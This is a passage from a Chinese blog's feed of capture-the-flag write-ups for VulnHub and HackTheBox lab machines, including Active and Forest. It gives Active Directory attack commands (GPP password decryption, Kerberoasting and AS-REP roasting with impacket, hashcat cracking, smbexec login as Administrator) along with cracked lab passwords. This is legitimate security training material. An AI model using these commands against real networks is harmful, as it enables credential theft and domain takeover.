&lt;/p&gt;
&lt;p&gt;表名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE092d98297cb3dcdf9425e1f52fd32d62image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;列名：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf06a3da5fc6fa9f6c7592d1700052202image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆用户：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73d4eb15471bc65d5caa1927142b8ce7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;James ,Theodore ,Samantha ,Lauren ,William ,Sabrina ,Robert ,Thane ,Carmon ,Barry ,Oliver ,Michelle ,Gloria ,Victoria ,Alexendra ,Baxter ,Clara ,Barbra ,Lenord ,Austin ,Garfield ,Juliette ,Victor ,Lucifer ,Bruno ,Diablo ,Robin ,Stan ,yoshihide ,admin ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,cxk ,aikun&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x010 My File Server 1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x010-my-file-server-1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x010-my-file-server-1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE607803e9db4e385a56041f94df03737c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE240a54f550c9359a780308c07f403444%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEdf0dece76cb4302705883bc750ea25dd%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;信息收集&#34;&gt;信息收集&lt;/h1&gt;
&lt;p&gt;21端口，有匿名登录，但是目前来看没有发现什么有效的东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE677f3992f3e0efff0fe2c03e96da0ba8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;2049 nfs端口，这里遇到一个问题，似乎只有同一网段才能挂载成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8007cff462e94048660b983350617ae7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;NFS内容看起来和FTP一样，但是权限高不少：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf375917bae4dd8a17b222f00e470afa3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEbb98612aa38d32ded88fcafb7336aabf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE109d19ed67363acb230a99bbd97e3209%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE50d6e5cd0e6a2a2f46411b02eaa27f3e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE97b604408d6b3284662362fcedb6acdc%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现多个用户名，根据家目录和环境判断，其中smbuser大概率是可以登录的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5317791457913edc6ac6a9ad0860b71d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7ee02d9077943cf97805a4e36613514b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEae947895ae357079bbd9cdaf81bb4d6e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码rootroot1&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE16a0df2d3c0a92a7fabd73b97d0be665%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是ssh连接失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE071efa53ccab0d3ddac78cc78582e819%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就剩下最后一个端口：445&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE438cea2412426bd21bfbc4e1c10e90d8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;匿名登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE83f99c60a3f2f3697796a29a70c87b16%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1bbe1161602cbe40f7a46b5dfd5c26bf%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;说实话打到这里基本上，已经没有思路了，基本能看的地方都看了，手里拿到了一个账户和密码，但是无法登录，看了一下wp，让我登录FTP再看看，没想到再次登录FTP的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEc7134c5e3fb395216419ede80cc585be%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;生成公私钥：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE108ba492ec7b53f957a68f6787ae116e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上传：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4b584b30ca7646c25a77a865c385aa39%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里有坑，使用kali默认的私钥名字连不上，改成其他名字一下就可以了&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;有GCC可以用内核提权：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE79fe9927799a5d921bc450f15d8075d3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;随便找了一个2021-4034：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE7b3aaa2c0007045e363d161bd0eb24b0%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;此靶机不是单纯的集中某个技能点，而是需要反复的进行信息收集，极其容易导致遗漏。&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x011 Broken Gallery</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x011-broken-gallery/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x011-broken-gallery/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf44623b5f75937cb5a8a04f722234d1c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE47292f9b3fcda8b6bfd726dc07c3afe4%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;WEB渗透&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3ed52382191572118c01223551bc1cfb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;大致看了一下，目录浏览了都，就没必要目录扫描了，发现readme.md的时候，我就觉得不妙：&lt;/p&gt;
&lt;p&gt;16进制字符串？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEefa2e4e6bd9739b13c5222b8c98ca0f3%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后大致看了一下图片，暂时没发现有用信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5404203c3e37ed592f62009b205803ed%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;我花了很长时间研究这个16进制文件，甚至尝试了强行爆破，但是没有太多办法，只能查看WP了：&lt;/p&gt;
&lt;p&gt;关于二进制恢复和查看信息的方法：&lt;/p&gt;
&lt;p&gt;xxd工具：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xxd -r -ps xxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可读字符查看，strings&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;strings xxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE686ec1d9acfd0ca31dd920d9ecdf185a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;恢复成图片就可以看到隐藏信息了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8fb0868e9423c689a2bf3ec14cd8ad85%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后续根据这个图片和网站生成针对性的字典，就可以爆破出SSH密码了，密码为broken:broken&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;提权就比较简单了，sudo&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE5356dace1fa9f76a48a0234021e59307%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;其实我不是很喜欢这个靶场，因为偏离实战太多，但是站在靶场设计者的角度思考，可能是想要补全一些关于隐藏信息的利用方式。&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X012 Active</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x012-active/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x012-active/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2b79f81f1e994947facb32e1d33427b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE57929fea3eb2c20e9a81cb222fdc2be2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;开始思考，从哪儿开始看起呢？还是smba吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe2ba0e29d1b9dba9ac848bc79d363f4dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：&lt;/p&gt;
&lt;p&gt;里面其实有东西的目录，应该就是这个目录了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE929b2ab801ddc22197d678d5b7b5f4c3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE87ab11f980a529d243a7b64203c532cfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现疑似账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7d244a94d67021c2c41a4546cb9562eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：&lt;/p&gt;
&lt;p&gt;gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&lt;/p&gt;
&lt;p&gt;密码为：GPPstillStandingStrong2k18&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9bedd112f49203bcdfaa39d7ab9e3eb4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;使用该凭证再次登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE440f4d2843d061cfa22720a98c061501image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE08147a54fd1836d6a1164e3cc671b872image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录后发现flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE537bd27ee83c3e4a88037526309a618aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE21b1337ec915a036acf313ff94cfe1e7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：&lt;/p&gt;
&lt;h1 id=&#34;kerberoasting&#34;&gt;kerberoasting&lt;/h1&gt;
&lt;p&gt;使用GetUserSPNs.py查询所有注册于用户下的spn:&lt;/p&gt;
&lt;p&gt;python GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd4ea9064ac216fbdda4e886205dc6e25image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取ST，保存为hashcat能爆破的格式：&lt;/p&gt;
&lt;p&gt;python /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE88b2ee81d90310dae17659e624785e0aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;爆破：&lt;/p&gt;
&lt;p&gt;hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt &amp;ndash;force&lt;/p&gt;
&lt;p&gt;Ticketmaster1968&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b8fa2eeaa852240dda639d8e2f24790image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smbexec:&lt;/p&gt;
&lt;p&gt;python /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x012 dpwwn 1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x012-dpwwn-1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x012-dpwwn-1-/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1f0727e791e5d361babce67301cc1809%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;web没发现问题，去找mysql的问题，直接开始爆破，发现被封了，第二天直接登录发现可以无密码：&lt;/p&gt;
&lt;p&gt;本来是想直接写webshell的，看来没成功，就算了，进行一下信息收集：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE248bacdf89021b9f019ca1bef4541829%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE965d2782fe1912683dbf5cb285426fd5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;mistic   | testP@$$swordmistic&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;计划任务提权？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE4be0d39f45116e66bfa8af0d116420ea%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEabbe5569312e1be757dce04ea33cc0a5%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE3fce700795054f0835f4332c24ae197e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE9c055e31b09972adca71e35ede944292%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X013 Forest</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x013-forest/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x013-forest/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93fdbc1cf8437edf1e751023e9ed1e2bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1e68350840d2018df4ed107ffb3f6c08image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE033784e1aad5bf646aee9b3abd881f80image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;smb无法利用，但是ldap存在匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc2050611b4266ff071f8d900185cfb69image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查询所有用户：&lt;/p&gt;
&lt;p&gt;ldapsearch -x -H ldap://10.10.10.161:389 -u &amp;rsquo;&amp;rsquo; -w &amp;rsquo;&amp;rsquo; -b &amp;ldquo;DC=htb,DC=local&amp;rdquo; &amp;ldquo;(&amp;amp;(objectCategory=person)(objectClass=user))&amp;rdquo; |grep dn&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfe4307047ea47ceafd2b1efe1def47d1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;经过一段处理：&lt;/p&gt;
&lt;p&gt;把用户名提取出来：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE64f411aa6c41500447fed65e433ecdc4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到所有的用户名，几个想法：1、密码喷洒；2、AS-REP Roasting&lt;/p&gt;
&lt;p&gt;用impacket工具包的GetNPUsers.py进行爆破，尝试获取hash&lt;/p&gt;
&lt;p&gt;python ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/&lt;/p&gt;
&lt;p&gt;发现可用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEca0d1df87d377c387427b0c959ac35b2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解hash:&lt;/p&gt;
&lt;p&gt;s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8320a03326f3360b22481ebb4298c5b3image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;5985开启，可用通过winrm getshell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb8bd0e5f6b4ae711c2d344b99403dcacimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE43c068ea933f27d2853b15eddedeec1dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;使用bloodhunnd:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb54eddfd1c767692663810ea6b449e24image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现两条路径：&lt;/p&gt;
&lt;p&gt;第一条是，CanPSRemote，通过登录来获取域管理员权限，但是前提是使用本地提权，然后DCSYNC，但是这条路不完全有效，后面看了一下，似乎不让读取系统信息，也就不要太好本地提权了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE50639070763fb043c8fb3a628461dedfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;第二条是通过EXCHANGE WINDOWS &lt;a href=&#34;mailto:PERMISSIONS@HTB.LOCALL&#34;&gt;PERMISSIONS@HTB.LOCALL&lt;/a&gt;这个组有完全控制权：bloodhound给的建议是给用户添加dcsync权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb406f0a27830d6d156e8a207be4c40bfimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么如何进入EXCHANGE WINDOWS &lt;a href=&#34;mailto:PERMISSIONS@HTB.LOCALL&#34;&gt;PERMISSIONS@HTB.LOCALL&lt;/a&gt;组呢：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x013 WestWild-1.1</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x013-westwild-1.1/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x013-westwild-1.1/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE6136c856ad93dc5c99736b2d864f4bff%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE45e092fd974183d2bf74983c2b4d3a34%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;WEB&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE981b273b7bf4971cfcee10205549815f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;SMB&lt;/p&gt;
